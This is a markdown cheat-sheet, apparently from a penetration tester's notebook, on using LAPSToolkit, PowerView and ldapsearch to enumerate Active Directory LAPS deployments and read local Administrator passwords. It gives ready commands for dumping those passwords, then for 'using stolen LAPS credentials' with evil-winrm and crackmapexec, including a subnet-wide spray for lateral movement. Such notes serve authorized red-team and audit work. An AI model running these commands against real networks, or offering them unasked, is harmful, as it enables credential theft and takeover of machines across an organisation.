# LAPSToolkit

**Tags:** `#lapstoolkit` `#laps` `#activedirectory` `#credentials` `#localadmin` `#powershell` `#postexploitation`

PowerShell toolkit leveraging PowerView to audit and attack LAPS (Local Administrator Password Solution) deployments. Finds computers with LAPS enabled, identifies which accounts can read LAPS passwords, and reads those passwords if the current user has permission. LAPS is extremely common in enterprise environments — always check it.

**Source:** https://github.com/leoloobeek/LAPSToolkit
**Install:**
```powershell
git clone https://github.com/leoloobeek/LAPSToolkit
Import-Module .\LAPSToolkit.ps1
# Requires PowerView — Import-Module .\PowerView.ps1 first
```

> [!note] **What is LAPS?** LAPS rotates the local Administrator password on domain-joined computers and stores it in AD (`ms-Mcs-AdmPwd` attribute). Only specific users/groups are delegated read access. If your current account has read rights, you get local admin on those machines.

---

## Find LAPS-Enabled Computers

```powershell
# All computers with LAPS enabled (ms-Mcs-AdmPwd attribute is set)
Get-LAPSComputers
# Returns: ComputerName, Enabled, Password (if readable), ExpirationTimestamp

# LAPS computers with readable passwords for current user
Get-LAPSComputers | Where-Object {$_.Password -ne $null}

# Specific computer
Get-LAPSComputers -ComputerName DC01
```

---

## Find Who Can Read LAPS Passwords

```powershell
# Find all groups and users delegated to read ms-Mcs-AdmPwd
Find-LAPSDelegatedGroups
# Returns: OUDistinguishedName, Groups that can read LAPS in that OU

# Extended rights on OUs — shows who has All Extended Rights (can read LAPS)
Find-AdmPwdExtendedRights
# Returns: ComputerName, OUDistinguishedName, Identity (account with rights)
```

---

## Read LAPS Passwords

```powershell
# Read LAPS password for all accessible computers
Get-LAPSComputers | Select-Object ComputerName, Password, ExpirationTimestamp

# Read password for a specific computer
Get-LAPSComputers -ComputerName WKSTN01 | Select-Object Password

# Quick one-liner — find all readable LAPS passwords
Get-LAPSComputers | Where-Object {$_.Password} | Select-Object ComputerName, Password
```

---

## Using Stolen LAPS Credentials

```bash
# Once you have the local Administrator password, use it for lateral movement
evil-winrm -i <target-ip> -u Administrator -p '<LAPS-password>'

crackmapexec smb <target-ip> -u Administrator -p '<LAPS-password>' --local-auth

# Check what else the same password works on (password reuse before LAPS was implemented)
crackmapexec smb 192.168.1.0/24 -u Administrator -p '<LAPS-password>' --local-auth
```

---

## Check LAPS Status via Registry (on target)

```powershell
# From inside a host — check if LAPS is installed and configured
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -ErrorAction SilentlyContinue
# AdmPwdEnabled = 1 → LAPS is active on this machine

# Check LAPS client DLL
Test-Path "C:\Program Files\LAPS\CSE\AdmPwd.dll"
```

---

## Manual LDAP Approach (no toolkit needed)

```powershell
# Read LAPS password directly via LDAP (PowerView)
Get-DomainComputer WKSTN01 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime,name | Select-Object

# All computers with readable LAPS passwords
Get-DomainComputer -Properties name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
  Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} |
  Select-Object name, 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'
```

```bash
# From Linux via ldapsearch
ldapsearch -x -H ldap://<dc-ip> -D 'DOMAIN\user' -w 'Password' \
  -b 'DC=domain,DC=local' \
  '(ms-MCS-AdmPwd=*)' \
  sAMAccountName ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
